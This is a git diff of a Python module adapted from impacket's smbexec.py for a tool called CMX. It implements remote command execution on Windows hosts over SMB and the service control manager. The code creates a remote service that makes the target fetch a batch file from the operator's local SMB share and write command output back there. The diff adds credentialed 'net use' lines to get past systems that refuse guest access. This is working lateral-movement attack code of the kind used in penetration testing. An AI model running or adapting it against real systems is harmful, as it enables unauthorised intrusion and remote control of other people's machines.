@@ -1,7 +1,38 @@
 
-# 
-# https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+# taken from: https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+
+# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
 #
+# This software is provided under under a slightly modified version
+# of the Apache Software License. See the accompanying LICENSE file
+# for more information.
+#
+# A similar approach to psexec w/o using RemComSvc. The technique is described here
+# https://www.optiv.com/blog/owning-computers-without-shell-access
+# Our implementation goes one step further, instantiating a local smbserver to receive the 
+# output of the commands. This is useful in the situation where the target machine does NOT
+# have a writeable share available.
+# Keep in mind that, although this technique might help avoiding AVs, there are a lot of 
+# event logs generated and you can't expect executing tasks that will last long since Windows 
+# will kill the process since it's not responding as a Windows service. 
+# Certainly not a stealthy way.
+#
+# This script works in two ways:
+# 1) share mode: you specify a share, and everything is done through that share.
+# 2) server mode: if for any reason there's no share available, this script will launch a local
+#    SMB server, so the output of the commands executed are sent back by the target machine
+#    into a locally shared folder. Keep in mind you would need root access to bind to port 445 
+#    in the local machine.
+# 
+# Author:
+#  beto (@agsolino)
+#
+# Reference for:
+#  DCE/RPC and SMB.
+#
+# Customized by @awsmhacks for CMX
+
+
 
 import logging
 import os
@@ -22,7 +53,9 @@ DUMMY_SHARE     = 'TMP'
 
 class SMBEXEC:
 
-    def __init__(self, host, share_name, protocol, username = '', password = '', domain = '', hashes = None, share = None, port=445):
+    def __init__(self, host, share_name, protocol, username = '', password = '',
+                 domain = '', hashes = None, share = None, port=445):
+
         self.__host = host
         self.__share_name = share_name
         self.__port = port
@@ -36,12 +69,12 @@ class SMBEXEC:
         self.__output = None
         self.__batchFile = None
         self.__outputBuffer = ''
-        self.__shell = '%COMSPEC% /Q /c '
+        self.__shell = 'cmd.exe /Q /c '
         self.__retOutput = False
         self.__rpctransport = None
         self.__scmr = None
         self.__conn = None
-        self.__mode  = 'SHARE'  # need to figure out the smbserver_dir(ectory) that we can always write too
+        self.__mode  = 'SHARE'  
         #self.__aesKey = aesKey
         #self.__doKerberos = doKerberos
 
@@ -69,7 +102,8 @@ class SMBEXEC:
 
         if hasattr(self.__rpctransport, 'set_credentials'):
             # This method exists only for selected protocol sequences.
-            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain,
+                                                self.__lmhash, self.__nthash)
         #rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
 
         self.__scmr = self.__rpctransport.get_dce_rpc()
@@ -101,18 +135,21 @@ class SMBEXEC:
         local_ip = self.__rpctransport.get_socket().getsockname()[0]
 
         if self.__retOutput:
-            command = self.__shell + data + ' ^> \\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output)
+            #adding creds gets past systems disallowing guest-auth
+            command = self.__shell + '"net use /persistent:no \\\\{}\\{} /user:{} {}" \n'.format(local_ip, self.__share_name, self.__username, self.__password) 
+            command += self.__shell + data + ' ^> \\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output)
         else:
             command = self.__shell + data
 
         with open((cfg.TMP_PATH / self.__batchFile), 'w') as batch_file:
             batch_file.write(command)
 
-        logging.debug('Hosting batch file with command: ' + command)
+        logging.debug('Hosting batch file({}) containing:\n{}'.format(str(cfg.TMP_PATH / self.__batchFile), command))
 
-        command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
+        command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__batchFile)
         #adding creds gets past systems disallowing guest-auth
-        command = '%COMSPEC% /Q /c "net use /persistent:no \\\\{}\\{} /user:{} {} & '.format(local_ip, self.__share_name, self.__username, self.__password) + command
+        command = self.__shell + '"net use /persistent:no \\\\{}\\{} /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
+        
         logging.debug('Command to execute: ' + command)
 
         logging.debug('Remote service {} created.'.format(self.__serviceName))
@@ -128,6 +165,7 @@ class SMBEXEC:
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output_fileless()
+
 
     def get_output_fileless(self):
         if not self.__retOutput: return
@@ -155,6 +193,7 @@ class SMBEXEC:
            scmr.hRCloseServiceHandle(self.__scmr, service)
         except:
             pass
+
 
 #Getting shellular
     def run(self, remoteName, remoteHost):
@@ -191,7 +230,7 @@ class SMBEXEC:
 
 
 #
-#https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+
 #
 class RemoteShell(cmd.Cmd):
     def __init__(self, share, rpc, mode, serviceName):
